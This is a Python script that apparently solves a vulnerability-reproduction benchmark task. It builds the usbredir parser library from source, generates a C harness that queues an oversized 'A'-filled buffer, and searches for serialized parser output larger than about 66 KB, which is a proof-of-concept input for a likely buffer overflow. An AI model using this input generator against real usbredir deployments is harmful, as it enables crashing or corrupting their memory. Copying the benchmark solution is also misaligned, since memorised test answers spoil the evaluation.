import os
import re
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path
from typing import List, Tuple, Optional


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    for member in tar.getmembers():
        member_path = os.path.realpath(os.path.join(path, member.name))
        if not (member_path == base or member_path.startswith(base + os.sep)):
            continue
        tar.extract(member, path=path)


def _read_text(path: str, limit: int = 2_000_000) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _strip_c_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", " ", s, flags=re.S)
    s = re.sub(r"//.*?$", " ", s, flags=re.M)
    return s


def _split_args(arg_str: str) -> List[str]:
    s = arg_str.strip()
    if not s or s == "void":
        return []
    out = []
    cur = []
    depth = 0
    i = 0
    while i < len(s):
        c = s[i]
        if c == "(":
            depth += 1
            cur.append(c)
        elif c == ")":
            depth -= 1
            cur.append(c)
        elif c == "," and depth == 0:
            part = "".join(cur).strip()
            if part:
                out.append(part)
            cur = []
        else:
            cur.append(c)
        i += 1
    part = "".join(cur).strip()
    if part:
        out.append(part)
    return out


def _ptype_pname(param: str) -> Tuple[str, str]:
    p = " ".join(param.strip().split())
    if p == "...":
        return ("...", "...")
    if "(*" in p:
        m = re.search(r"\(\*\s*([A-Za-z_]\w*)\s*\)", p)
        if m:
            name = m.group(1)
            ptype = p[: m.start()] + "(*)" + p[m.end() :]
            ptype = " ".join(ptype.strip().split())
            return (ptype, name)
        return (p, "")
    m = re.search(r"([A-Za-z_]\w*)\s*(\[[^\]]*\])?\s*$", p)
    if m:
        name = m.group(1)
        ptype = p[: m.start()].strip()
        if not ptype:
            ptype = p
        return (ptype, name)
    return (p, "")


def _find_files(root: str, filename: str) -> List[str]:
    res = []
    for dp, _, files in os.walk(root):
        for f in files:
            if f == filename:
                res.append(os.path.join(dp, f))
    res.sort(key=lambda x: (len(x), x))
    return res


def _find_c_files(root: str) -> List[str]:
    res = []
    for dp, _, files in os.walk(root):
        for f in files:
            if f.endswith(".c"):
                res.append(os.path.join(dp, f))
    res.sort()
    return res


def _file_has_main(path: str) -> bool:
    txt = _read_text(path, limit=200_000)
    if not txt:
        return False
    txt = _strip_c_comments(txt)
    return re.search(r"\bmain\s*\(", txt) is not None


def _file_contains_any(path: str, needles: List[str]) -> bool:
    txt = _read_text(path, limit=400_000)
    if not txt:
        return False
    return any(n in txt for n in needles)


def _extract_prototypes_from_header(header_text: str) -> List[dict]:
    t = _strip_c_comments(header_text)
    protos = []
    idx = 0
    while True:
        idx = t.find("usbredirparser_", idx)
        if idx < 0:
            break
        end = t.find(";", idx)
        if end < 0:
            break
        stmt = t[idx : end + 1]
        start = stmt.rfind("\n")
        stmt = stmt[start + 1 :].strip()
        if "(" not in stmt or ")" not in stmt or not stmt.endswith(";"):
            idx = end + 1
            continue
        m = re.search(r"\b(usbredirparser_[A-Za-z0-9_]+)\s*\(", stmt)
        if not m:
            idx = end + 1
            continue
        name = m.group(1)
        paren_start = stmt.find("(", m.end(1) - 1)
        if paren_start < 0:
            idx = end + 1
            continue
        depth = 0
        paren_end = -1
        for j in range(paren_start, len(stmt)):
            c = stmt[j]
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    paren_end = j
                    break
        if paren_end < 0:
            idx = end + 1
            continue
        args = stmt[paren_start + 1 : paren_end].strip()
        ret = stmt[: m.start(1)].strip()
        protos.append({"name": name, "args": args, "stmt": stmt, "ret": ret})
        idx = end + 1
    uniq = {}
    for p in protos:
        uniq[p["name"]] = p
    return list(uniq.values())


def _struct_defined_in_header(header_text: str) -> bool:
    t = _strip_c_comments(header_text)
    return re.search(r"\bstruct\s+usbredirparser\s*\{", t) is not None


def _pick_init_proto(protos: List[dict], struct_defined: bool) -> Optional[dict]:
    exact = next((p for p in protos if p["name"] == "usbredirparser_new"), None)
    if exact:
        return exact
    if struct_defined:
        exact = next((p for p in protos if p["name"] == "usbredirparser_init"), None)
        if exact:
            return exact
    candidates = []
    for p in protos:
        n = p["name"]
        if any(x in n for x in ("_new", "_create", "_alloc")) and "serialize" not in n and "deserialize" not in n:
            candidates.append(p)
    def score(p: dict) -> Tuple[int, int]:
        n = p["name"]
        r = p["ret"]
        a = len(_split_args(p["args"]))
        s = 0
        if "new" in n:
            s -= 10
        if "create" in n:
            s -= 5
        if "*" in r and "usbredirparser" in r:
            s -= 10
        return (s, a)
    candidates.sort(key=score)
    for p in candidates:
        if "*" in p["ret"] and "usbredirparser" in p["ret"]:
            return p
    return None


def _pick_serialize_proto(protos: List[dict]) -> Optional[dict]:
    exact = next((p for p in protos if p["name"] == "usbredirparser_serialize"), None)
    if exact:
        return exact
    candidates = [p for p in protos if "serialize" in p["name"] and "deserialize" not in p["name"]]
    candidates.sort(key=lambda p: (0 if p["name"].endswith("_serialize") else 1, len(_split_args(p["args"])), p["name"]))
    return candidates[0] if candidates else None


def _pick_payload_protos(protos: List[dict]) -> List[dict]:
    blacklist = ("serialize", "deserialize", "init", "uninit", "new", "free", "destroy")
    candidates = []
    for p in protos:
        n = p["name"]
        ln = n.lower()
        if any(b in ln for b in blacklist):
            continue
        if not any(k in ln for k in ("send", "write", "queue", "out")):
            continue
        args = _split_args(p["args"])
        if not args:
            continue
        has_data_ptr = False
        has_len = False
        for a in args:
            at = a.lower()
            if ("uint8_t" in at or "char" in at or "void" in at) and "*" in at and ("data" in at or "buf" in at or "payload" in at):
                has_data_ptr = True
            if any(x in at for x in ("len", "length", "size", "count")) and any(x in at for x in ("int", "size_t", "uint32_t", "uint16_t", "unsigned", "long")):
                has_len = True
        if has_data_ptr and has_len:
            candidates.append(p)
    prefer = [
        "usbredirparser_queue_write",
        "usbredirparser_write",
        "usbredirparser_send_data",
        "usbredirparser_send_bulk",
        "usbredirparser_send_buffer",
    ]
    def score(p: dict) -> Tuple[int, int, int, str]:
        n = p["name"]
        a = len(_split_args(p["args"]))
        pri = 100
        for i, pref in enumerate(prefer):
            if pref in n:
                pri = i
                break
        return (pri, a, len(n), n)
    candidates.sort(key=score)
    return candidates


def _choose_cc() -> Optional[str]:
    for c in ("clang", "gcc", "cc"):
        p = shutil.which(c)
        if p:
            return p
    return None


def _collect_include_dirs(root: str, header_paths: List[str]) -> List[str]:
    dirs = {root}
    for hp in header_paths:
        dirs.add(str(Path(hp).parent))
    for p in header_paths:
        d = Path(p).parent
        for _ in range(3):
            dirs.add(str(d))
            d = d.parent
    return sorted(dirs, key=lambda x: (len(x), x))


def _compile_objects(cc: str, sources: List[str], include_dirs: List[str], cflags: List[str], build_dir: str) -> Tuple[bool, List[str], str]:
    objs = []
    errlog = []
    for i, src in enumerate(sources):
        obj = os.path.join(build_dir, f"obj_{i}.o")
        cmd = [cc, "-c", src, "-o", obj] + cflags
        for inc in include_dirs:
            cmd.extend(["-I", inc])
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if proc.returncode != 0:
            errlog.append(proc.stderr.decode("utf-8", errors="ignore"))
            return (False, [], "\n".join(errlog))
        objs.append(obj)
    return (True, objs, "")


def _link_exe(cc: str, main_c: str, objs: List[str], include_dirs: List[str], cflags: List[str], out_exe: str) -> Tuple[bool, str]:
    cmd = [cc, main_c] + objs + ["-o", out_exe, "-pthread"] + cflags
    for inc in include_dirs:
        cmd.extend(["-I", inc])
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if proc.returncode != 0:
        return (False, proc.stderr.decode("utf-8", errors="ignore"))
    return (True, "")


def _gen_c_code(header_basename: str, initp: dict, payloadp: dict, ser: dict, struct_defined: bool) -> str:
    init_args = _split_args(initp["args"])
    payload_args = _split_args(payloadp["args"])
    ser_args = _split_args(ser["args"])

    def is_parser_param(ptype: str, pname: str) -> bool:
        s = (ptype + " " + pname).lower()
        return "usbredirparser" in s and "*" in s

    def is_data_ptr(ptype: str, pname: str) -> bool:
        s = (ptype + " " + pname).lower()
        if "*" not in s:
            return False
        if ("uint8_t" in s or "char" in s or "void" in s) and any(k in s for k in ("data", "buf", "payload")):
            return True
        return False

    def is_len_param(ptype: str, pname: str) -> bool:
        s = (ptype + " " + pname).lower()
        if not any(k in s for k in ("len", "length", "size", "count")):
            return False
        return any(k in s for k in ("int", "size_t", "uint32_t", "uint16_t", "unsigned", "long"))

    def is_cb_param(ptype: str, pname: str) -> bool:
        s = (ptype + " " + pname).lower()
        if "(*" in ptype:
            return True
        if any(k in s for k in ("_cb", "callback", "cb", "func", "handler")) and "*" not in s:
            return True
        if any(k in s for k in ("write", "read", "log")) and ("_t" in s or "_cb" in s or "func" in s):
            return True
        return False

    def mk_cast(ptype: str, expr: str) -> str:
        pt = " ".join(ptype.split())
        pt = pt.replace("register ", "").replace("restrict ", "")
        return f"(({pt})({expr}))"

    def arg_expr(ptype: str, pname: str, ctx: str) -> str:
        l = (ptype + " " + pname).lower()
        if ptype == "...":
            return "0"
        if "usbredirparser" in l and "*" in l:
            if ctx == "init_first" and initp["name"] == "usbredirparser_init":
                return "&parser"
            return "p"
        if is_data_ptr(ptype, pname):
            return "bigbuf"
        if is_len_param(ptype, pname):
            return mk_cast(ptype, "biglen")
        if "**" in ptype and ("uint8_t" in l or "char" in l):
            return "&out"
        if "*" in ptype and any(k in l for k in ("len", "length", "size", "count")) and any(k in l for k in ("int", "size_t", "uint32_t", "unsigned", "long")):
            if "size_t" in l:
                return "&outlen_sz"
            if "uint32_t" in l:
                return "&outlen_u32"
            return "&outlen_i"
        if is_cb_param(ptype, pname):
            if "write" in l:
                return mk_cast(ptype, "write_cb")
            if "read" in l:
                return mk_cast(ptype, "read_cb")
            if "log" in l:
                return mk_cast(ptype, "log_cb")
            return mk_cast(ptype, "dummy_cb")
        if "*" in ptype:
            return "NULL"
        if any(k in l for k in ("int", "size_t", "uint32_t", "uint16_t", "unsigned", "long")):
            return "0"
        return "0"

    init_call_args = []
    for a in init_args:
        ptype, pname = _ptype_pname(a)
        init_call_args.append(arg_expr(ptype, pname, "init_first"))

    payload_call_args = []
    for a in payload_args:
        ptype, pname = _ptype_pname(a)
        payload_call_args.append(arg_expr(ptype, pname, "payload"))

    ser_call_args = []
    used_len_var = "0"
    for a in ser_args:
        ptype, pname = _ptype_pname(a)
        e = arg_expr(ptype, pname, "serialize")
        ser_call_args.append(e)
        if e in ("&outlen_i", "&outlen_u32", "&outlen_sz"):
            used_len_var = e

    if used_len_var == "&outlen_sz":
        outlen_expr = "outlen_sz"
    elif used_len_var == "&outlen_u32":
        outlen_expr = "(size_t)outlen_u32"
    elif used_len_var == "&outlen_i":
        outlen_expr = "(size_t)outlen_i"
    else:
        outlen_expr = "0"

    init_snippet = ""
    if initp["name"] == "usbredirparser_new":
        init_snippet = f"""
    struct usbredirparser *p = {initp['name']}({", ".join(init_call_args)});
    if (!p) return 1;
"""
    elif initp["name"] == "usbredirparser_init" and struct_defined:
        init_snippet = f"""
    struct usbredirparser parser;
    memset(&parser, 0, sizeof(parser));
    struct usbredirparser *p = &parser;
    (void){initp['name']}({", ".join(init_call_args)});
"""
    else:
        if struct_defined:
            init_snippet = f"""
    struct usbredirparser parser;
    memset(&parser, 0, sizeof(parser));
    struct usbredirparser *p = &parser;
    (void){initp['name']}({", ".join(init_call_args)});
"""
        else:
            init_snippet = f"""
    struct usbredirparser *p = {initp['name']}({", ".join(init_call_args)});
    if (!p) return 1;
"""

    code = f"""
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>

#include "{header_basename}"

static int write_cb(void *priv, uint8_t *data, int len) {{
    (void)priv; (void)data; (void)len;
    errno = EAGAIN;
    return 0;
}}

static int read_cb(void *priv, uint8_t *data, int len) {{
    (void)priv; (void)data; (void)len;
    errno = EAGAIN;
    return 0;
}}

static void log_cb(void *priv, const char *fmt, ...) {{
    (void)priv; (void)fmt;
}}

static void dummy_cb(void) {{
}}

int main(int argc, char **argv) {{
    size_t biglen = 70000;
    if (argc > 1) {{
        unsigned long v = strtoul(argv[1], NULL, 10);
        if (v > 0) biglen = (size_t)v;
    }}

    uint8_t *bigbuf = (uint8_t*)malloc(biglen ? biglen : 1);
    if (!bigbuf) return 1;
    memset(bigbuf, 0x41, biglen ? biglen : 1);

{init_snippet}

    (void){payloadp['name']}({", ".join(payload_call_args)});

    uint8_t *out = NULL;
    int outlen_i = 0;
    uint32_t outlen_u32 = 0;
    size_t outlen_sz = 0;

    int sret = (int){ser['name']}({", ".join(ser_call_args)});
    (void)sret;

    size_t outlen = {outlen_expr};
    if (!out || outlen == 0) return 2;

    if (fwrite(out, 1, outlen, stdout) != outlen) return 3;
    return 0;
}}
"""
    return code


class Solution:
    def solve(self, src_path: str) -> bytes:
        cc = _choose_cc()
        if cc is None:
            return b"A" * 70000

        with tempfile.TemporaryDirectory() as td:
            root = None
            sp = Path(src_path)
            if sp.is_dir():
                root = str(sp)
            else:
                try:
                    with tarfile.open(src_path, "r:*") as tar:
                        _safe_extract_tar(tar, td)
                    root = td
                except Exception:
                    return b"A" * 70000

            hdrs = _find_files(root, "usbredirparser.h")
            if not hdrs:
                for dp, _, files in os.walk(root):
                    for f in files:
                        if f.endswith(".h") and "usbredirparser" in f:
                            hdrs.append(os.path.join(dp, f))
                hdrs.sort(key=lambda x: (len(x), x))
            if not hdrs:
                return b"A" * 70000

            header_path = hdrs[0]
            header_basename = os.path.basename(header_path)
            header_text = _read_text(header_path)
            if not header_text:
                return b"A" * 70000

            protos = _extract_prototypes_from_header(header_text)
            struct_defined = _struct_defined_in_header(header_text)

            initp = _pick_init_proto(protos, struct_defined)
            ser = _pick_serialize_proto(protos)
            payload_candidates = _pick_payload_protos(protos)

            if initp is None or ser is None or not payload_candidates:
                return b"A" * 70000

            include_dirs = _collect_include_dirs(root, [header_path])

            all_c = _find_c_files(root)
            preferred_srcs = []
            for p in all_c:
                base = os.path.basename(p)
                if "test" in p.lower() or "example" in p.lower() or "fuzz" in p.lower() or "tool" in p.lower():
                    continue
                if _file_has_main(p):
                    continue
                if "usbredir" in base.lower() or _file_contains_any(p, ["usbredirparser_", "usbredirproto_"]):
                    preferred_srcs.append(p)

            if not preferred_srcs:
                preferred_srcs = [p for p in all_c if not _file_has_main(p)]

            build_dir = os.path.join(td, "build")
            os.makedirs(build_dir, exist_ok=True)

            cflags = [
                "-O2",
                "-std=c99",
                "-D_GNU_SOURCE",
                "-DUSBREDIRPARSER_SERIALIZE_BUF_SIZE=1048576",
                "-w",
            ]

            ok, objs, err = _compile_objects(cc, preferred_srcs, include_dirs, cflags, build_dir)
            if not ok:
                broader_srcs = []
                for p in all_c:
                    pl = p.lower()
                    if any(x in pl for x in ("/tests/", "/test/", "/examples/", "/tools/", "/fuzz/")):
                        continue
                    if _file_has_main(p):
                        continue
                    broader_srcs.append(p)
                ok, objs, err2 = _compile_objects(cc, broader_srcs, include_dirs, cflags, build_dir)
                if not ok:
                    return b"A" * 70000

            threshold = 65536 + 2048

            gen_c = os.path.join(build_dir, "gen.c")
            gen_exe = os.path.join(build_dir, "gen_exe")

            def run_gen(biglen: int) -> Optional[bytes]:
                try:
                    proc = subprocess.run(
                        [gen_exe, str(biglen)],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.DEVNULL,
                        timeout=5,
                    )
                    if proc.returncode != 0:
                        return None
                    out = proc.stdout
                    if not out:
                        return None
                    return out
                except Exception:
                    return None

            for payloadp in payload_candidates[:6]:
                code = _gen_c_code(header_basename, initp, payloadp, ser, struct_defined)
                try:
                    with open(gen_c, "w", encoding="utf-8") as f:
                        f.write(code)
                except Exception:
                    continue

                ok_link, _ = _link_exe(cc, gen_c, objs, include_dirs, cflags, gen_exe)
                if not ok_link:
                    continue

                out = run_gen(70000)
                if out is None:
                    continue
                if len(out) < threshold:
                    out2 = run_gen(200000)
                    if out2 is None or len(out2) < threshold:
                        continue
                    out = out2

                lo, hi = 1, 70000
                if len(out) >= threshold:
                    hi = 70000
                else:
                    hi = 200000

                best = out
                while lo < hi:
                    mid = (lo + hi) // 2
                    o = run_gen(mid)
                    if o is None:
                        lo = mid + 1
                        continue
                    if len(o) >= threshold:
                        best = o
                        hi = mid
                    else:
                        lo = mid + 1

                final = run_gen(hi)
                if final is not None and len(final) >= threshold:
                    return final
                return best

            return b"A" * 70000